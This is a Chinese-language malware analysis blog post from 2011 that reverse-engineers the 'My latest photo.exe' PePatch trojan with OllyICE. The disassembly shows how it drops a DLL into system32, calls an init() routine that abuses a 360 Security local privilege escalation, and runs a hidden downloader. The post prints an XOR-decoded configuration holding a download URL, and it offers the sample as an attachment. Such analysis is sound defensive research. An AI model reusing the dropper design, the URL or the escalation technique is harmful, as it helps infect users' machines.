
# “我的最新照片.exe” PePatch 病毒分析

> 原文：[www.pediy.com/kssd/pediy12/130806.html](https://www.pediy.com/kssd/pediy12/130806.html)

*   **病毒名称**: `Packed.Win32.PePatch.lx` [卡巴给的名字]
*   **分析时间**: 2011/03/14
*   **危害等级**: 中
*   **文章作者**: `DeathMemory`
*   **个人主页**: [http://hi.baidu.com/deathmemory_dm](http://hi.baidu.com/deathmemory_dm)
*   **软件大小**: 37.680 KB
*   **加壳方式**: `UPX` 修改壳
*   **使用工具**: `OllyICE`, `PEID`
*   **操作平台**: `XPsp3`
*   **作者声明**: 因为病毒变种或病毒配置等其它原因，此分析不能说明所有 `PePatch` 病毒的行为
*   **病毒样本**: 为了避免杀软的报警干扰，我把文件头的 `MZ` 改成了 `DM`，文件名后缀直接改为了 `RAR`。请想要测试的朋友自行修改回来。下载见附件。

=================================================================

## 病毒行为分析

用 `PEID` 载入病毒程序，无法正确识别语言或加壳类型。

查看 `EP` 段的时候，发现有 `UPX0` 和 `UPX1` 两个节，看起来应该是加了 `UPX` 壳吧，而且把加过壳的程序修改了，因此 `PEID` 没有正确识别出来。

不过没关系，反正 `UPX` 壳又不是骨肉相连的，程序运行后，代码会被还原回来。

我先用 `RegSnap` 对比了一下病毒运行前后，系统文件被修改的情况。对病毒的行为有了个大体的认识。

知道它大致在某处生成了一些文件和注册表信息（这里没有注册表操作信息）。

`OD` 载入程序后，一开始就被断在了 `retn` 处……这……这果然是没有脱壳的后果吗，而且还是被修改后的壳。

起初我还以为是病毒程序做了反调试，于是在这上面费了不少时间，后来按下 `F9`，发现病毒可以正常运行，而不是反调试的退出。

但是断下的地方是 `retn`，而且是在 `ntdll` 领空，如何才能返回到病毒程序的领空呢？

用 `Ctrl+F9` 显然太慢。我想既然病毒要生成新文件，那八成会用到 `CreateFile` 函数吧。

直接在 `CreateFile` 函数上下断: `bp CreateFileA`

果然断下来了，按 `Ctrl+F9` 返回到调用处后就是病毒程序领空了。

当我设断的时候，`OD` 提示说“您将在代码范围外设置断点……”

我估计是因为壳的原因，所以 `OD` 认为这里的代码不是在 `CS` 段里？

===>>

## 代码分析

来到程序领空后，代码就一目了然了。

```assembly
004022C0    81EC E4040000   SUB ESP,4E4
004022C6    A1 00404000     MOV EAX,DWORD PTR DS:[404000]
004022CB    33C4           XOR EAX,ESP
004022CD    898424 E0040000 MOV DWORD PTR SS:[ESP+4E0],EAX
004022D4    FF05 00504000   INC DWORD PTR DS:[405000]
004022DA    90             NOP
004022DB    90             NOP
004022DC    33C0           XOR EAX,EAX
004022DE    90             NOP
004022DF    90             NOP
004022E0    33C0           XOR EAX,EAX
004022E2    68 03010000     PUSH 103
004022E7    8D8424 D4000000 LEA EAX,DWORD PTR SS:[ESP+D4]
004022EE    50             PUSH EAX
004022EF    FF15 18304000   CALL DWORD PTR DS:[403018]           ; kernel32.GetSystemDirectoryA
004022F5    90             NOP
004022F6    90             NOP
```

发现 `GetSystemDirectoryA` 离程序入口比较近，以后就用 `bp GetSystemDirectoryA` 断这个函数吧。

### 继续向下分析

调用 `GetSystemDirectoryA` 获取系统目录

调用 `GetTempPathA` 获取系统临时文件夹目录

查找名为 `65` 资源，并获取资源大小，然后加载资源

...

```assembly
00402430    33C0           XOR EAX,EAX
00402432    68 EC304000     PUSH 复件_(2).004030EC               ; CYCS
00402437    6A 65          PUSH 65
00402439    6A 00          PUSH 0
0040243B    FF15 60304000   CALL DWORD PTR DS:[403060]           ; kernel32.FindResourceA
00402441    8BF0           MOV ESI,EAX
00402443    56             PUSH ESI
00402444    6A 00          PUSH 0
00402446    FF15 10304000  CALL DWORD PTR DS:[403010]           ; kernel32.SizeofResource
0040244C    56             PUSH ESI
0040244D    6A 00          PUSH 0
0040244F    8BF8           MOV EDI,EAX
00402451    FF15 58304000  CALL DWORD PTR DS:[403058]           ; kernel32.LoadResource
```

获取 `imm32.dll` 句柄

```assembly
00402457    68 84304000     PUSH 复件_(2).00403084               ; imm32.dll
0040245C    8BD8            MOV EBX,EAX
0040245E    FF15 38304000   CALL DWORD PTR DS:[403038]           ; kernel32.GetModuleHandleA
```

...

```assembly
00402471    68 00100000     PUSH 1000                            ; PAGE_READWRITE
00402476    8D47 01         LEA EAX,DWORD PTR DS:[EDI+1]         ; MEM_COMMIT
00402479    50              PUSH EAX                              ; A001;40961.
0040247A    6A 00           PUSH 0                                ; NULL
0040247C    FF15 20304000   CALL DWORD PTR DS:[403020]           ; kernel32.VirtualAlloc
```

`;MEM_COMMIT 在内存或者指定的磁盘页文件(虚拟内存文件)中分配一物理存储区域 函数初始化这个区域为 0`

接下来获取当前进程句柄，并向里写入数据

打开 `"C:\WINDOWS\system32\lqcyc52.cyc"` 写入病毒体

```assembly
004024BE    68 00000040     PUSH 40000000
004024C3    8D9424 F8010000 LEA EDX,DWORD PTR SS:[ESP+1F8]
004024CA    66:891E        MOV WORD PTR DS:[ESI],BX
004024CD    52              PUSH EDX        ;"C:\WINDOWS\system32\lqcyc52.cyc"
004024CE    8946 02         MOV DWORD PTR DS:[ESI+2],EAX
004024D1    FF15 64304000   CALL DWORD PTR DS:[403064]           ; kernel32.CreateFileA
```

写入后关闭句柄，并用 `LoadLibraryA` 以动态链接库的方式载入刚才生成的文件 `"C:\WINDOWS\system32\lqcyc52.cyc"`

并且获取函数 `init()` 的地址

```assembly
004024D7    6A 00           PUSH 0
004024D9    8BD8            MOV EBX,EAX
004024DB    8D4424 10       LEA EAX,DWORD PTR SS:[ESP+10]
004024DF    50              PUSH EAX
004024E0    57              PUSH EDI
004024E1    56              PUSH ESI
004024E2    53              PUSH EBX
004024E3    FF15 08304000   CALL DWORD PTR DS:[403008]           ; kernel32.WriteFile
004024E9    53              PUSH EBX
004024EA    FF15 40304000   CALL DWORD PTR DS:[403040]           ; kernel32.CloseHandle
004024F0    8D8C24 E0010000 LEA ECX,DWORD PTR SS:[ESP+1E0]
004024F7    51              PUSH ECX
004024F8    FF15 2C304000   CALL DWORD PTR DS:[40302C]           ; kernel32.LoadLibraryA
004024FE    68 20314000     PUSH 复件_(2).00403120               ; init
00402503    50              PUSH EAX
00402504    FF15 1C304000   CALL DWORD PTR DS:[40301C]           ; kernel32.GetProcAddress 获取 init() 函数地址
```

调用 `CopyFileA` 拷贝 `"C:\WINDOWS\system32\lqcyc52.cyc"` 到 `"C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\setupapi.dll"` 临时文件

```assembly
;0012FAC8   0012FCB4  |ExistingFileName = "C:\WINDOWS\system32\lqcyc52.cyc"
;0012FACC   0012FAE8  |NewFileName = "C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\setupapi.dll"
;0012FAD0   00000000  \FailIfExists = FALSE
```

之后调用 `init()` 函数，会提示未找到 `"C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\360tray.exe"`

```assembly
0040250A    6A 00           PUSH 0
0040250C    8D5424 18       LEA EDX,DWORD PTR SS:[ESP+18]
00402510    8BF0           MOV ESI,EAX
00402512    52              PUSH EDX
00402513    8D8424 E8010000 LEA EAX,DWORD PTR SS:[ESP+1E8]
0040251A    50              PUSH EAX
0040251B    FF15 24304000   CALL DWORD PTR DS:[403024]           ; kernel32.CopyFileA
00402521    FFD6            CALL ESI                              ; 调用 init() 函数
```

我首先想到的是，这个病毒可能是利用当时 360 本地提权漏洞的，由于我的虚拟机没有安装 360 安全卫士，所以病毒程序 throw 出了一条错误。

这种明显的暴露，没有做容错处理，也是病毒设计的不完善的地方。

`init()` 函数里面是怎么执行的我们先不管，继续向下。

函数调用后会 `Sleep 2000ms`

之后紧跟着两个 `Call`，

这两个 `Call` 也先不跟进去，先把程序的流程走完。

之后就是程序的退出了。

先猜测一下这两个 `Call` 的作用，程序跟到这里还有什么功能没有实现呢？

===猜测===

只有下载运行病毒和程序的自删除了。`init()` 这个函数猜测大体是用来提权的

那么第一个 `Call` 应该是下载运行其它病毒

第二个 `Call` 应该是自删除了

我们先这么猜着 =,= !

==========

好，我们现在再回过头来解决前面剩下的疑问。

先去 `init()` 函数里面看看，是实现的什么功能

上来就是一个大跳

```assembly
100010A0  >- E9 DD910000     JMP lqcyc52.1000A282
```

下面一个 `Call` 是 360 利用函数

```assembly
1000BE61    E8 4DF2FFFF     CALL lqcyc52.1000B0B3             ; 360 利用函数
```

里面有各种跳 =,= ! 最终目的就是利用 360 提权的，对 360 本地提权漏洞网上已经有公布利用代码和原理了，这里就不罗嗦了。

```assembly
1000BDB2    E8 37D1FFFF     CALL lqcyc52.10008EEE
```

360 本地提权漏洞主要是用来写注册表操作的。我这里没有安装 360 所以注册表操作部分~~就省略了~~~

跟到第一个 `Call` 中

首先获取了系统目录 `"C:\WINDOWS"`，加载资源 `66`，写入当前进程内存空间，和上面的代码一样。

生成 `"C:\WINDOWS\systemdebug.exe"` 向里面写入数据。

```assembly
004021C0    68 00000040     PUSH 40000000
004021C5    66:891E         MOV WORD PTR DS:[ESI],BX
004021C8    68 58444000     PUSH 复件_(2).00404458             ; C:\WINDOWS\systemdebug.exe
004021CD    8946 02         MOV DWORD PTR DS:[ESI+2],EAX
004021D0    FF15 64304000   CALL DWORD PTR DS:[403064]         ; kernel32.CreateFileA
```

打开自身，将文件指针移到指定位置，并从里面循环读取读取配置信息

`;ASCII "OOOOOOhttp://www.nhiry.com/1.txt|C:\WINDOWS\boot.ini"`

最后用隐藏方式运行 `"C:\WINDOWS\systemdebug.exe"` 执行其它病毒的下载运行模块

```assembly
00402267    8038 00         CMP BYTE PTR DS:[EAX],0
0040226A    74 03           JE SHORT 复件_(2).0040226F
0040226C    8030 12         XOR BYTE PTR DS:[EAX],12
0040226F    40              INC EAX
00402270   ^ E2 F5          LOOPD SHORT 复件_(2).00402267    ;循环读取字符
```

...

```assembly
00402293    6A 00           PUSH 0
```
